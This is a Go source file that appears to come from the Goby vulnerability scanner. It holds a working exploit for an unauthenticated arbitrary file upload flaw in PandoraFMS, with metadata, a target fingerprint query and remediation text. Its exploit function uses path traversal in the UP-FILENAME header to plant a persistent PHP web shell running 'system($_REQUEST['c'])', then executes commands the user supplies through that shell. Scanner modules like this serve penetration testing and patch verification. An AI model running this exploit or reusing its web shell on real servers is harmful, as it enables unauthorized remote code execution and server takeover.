package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "PandoraFMS upload_head_image.php Arbitrary File Upload Vulnerability",
    "Description": "<p>PandoraFMS is an application software of American PandoraFMS. Provides a monitoring function.</p><p>There is an unauthorized file upload vulnerability in PandoraFMS upload_head_image.php. Attackers can upload malicious Trojan horses to obtain server permissions.</p>",
    "Product": "PANDORAFMS-Products",
    "Homepage": "http://pandorafms.org/",
    "DisclosureDate": "2023-01-30",
    "Author": "corp0ra1",
    "FofaQuery": "body=\"pandora_console/\"",
    "GobyQuery": "body=\"pandora_console/\"",
    "Level": "3",
    "Impact": "<p>There is an unauthorized file upload vulnerability in PandoraFMS upload_head_image.php. Attackers can upload malicious Trojan horses to obtain server permissions.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://pandorafms.com/.\">https://pandorafms.com/.</a></p>",
    "References": [
        "https://3sjay.github.io/2023/01/06/pandoraFMS-Pre-Auth-RCE.html"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "PandoraFMS 软件 upload_head_image.php 任意文件上传漏洞",
            "Product": "PANDORAFMS-产品",
            "Description": "<p>PandoraFMS是美国PandoraFMS的一个应用软件。提供一个监控功能。<br></p><p>PandoraFMS upload_head_image.php 存在未授权文件上传漏洞，攻击者可上传恶意木马获取服务器权限。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://pandorafms.com/\">https://pandorafms.com/</a>。<br></p>",
            "Impact": "<p>PandoraFMS upload_head_image.php 存在未授权文件上传漏洞，攻击者可上传恶意木马获取服务器权限。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "PandoraFMS upload_head_image.php Arbitrary File Upload Vulnerability",
            "Product": "PANDORAFMS-Products",
            "Description": "<p>PandoraFMS is an application software of American PandoraFMS. Provides a monitoring function.<br></p><p>There is an unauthorized file upload vulnerability in PandoraFMS upload_head_image.php. Attackers can upload malicious Trojan horses to obtain server permissions.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://pandorafms.com/.\">https://pandorafms.com/.</a><br></p>",
            "Impact": "<p>There is an unauthorized file upload vulnerability in PandoraFMS upload_head_image.php. Attackers can upload malicious Trojan horses to obtain server permissions.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10796"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			randFile := goutils.RandomHexString(6)
			uri := "/pandora_console/enterprise/meta/general/upload_head_image.php?up=true"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("UP-FILENAME", fmt.Sprintf("../../../../../../../../../../var/www/html/pandora_console/extensions/%s.php", randFile))
			cfg.Data = "<?php echo md5(233);unlink(__FILE__);?>"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && resp.StatusCode == 200 {
				uri2 := "/pandora_console/extensions/" + randFile + ".php"
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "e165421110ba03099a1c0393373c5b43")
				}

			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			randFile := goutils.RandomHexString(6)
			uri := "/pandora_console/enterprise/meta/general/upload_head_image.php?up=true"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("UP-FILENAME", fmt.Sprintf("../../../../../../../../../../var/www/html/pandora_console/extensions/%s.php", randFile))
			cfg.Data = "<?php system($_REQUEST['c']); ?>"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && resp.StatusCode == 200 {
				uri2 := "/pandora_console/extensions/" + randFile + ".php?c=" + cmd
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
					expResult.Output = resp2.RawBody
					expResult.Success = true
				}

			}
			return expResult
		},
	))
}
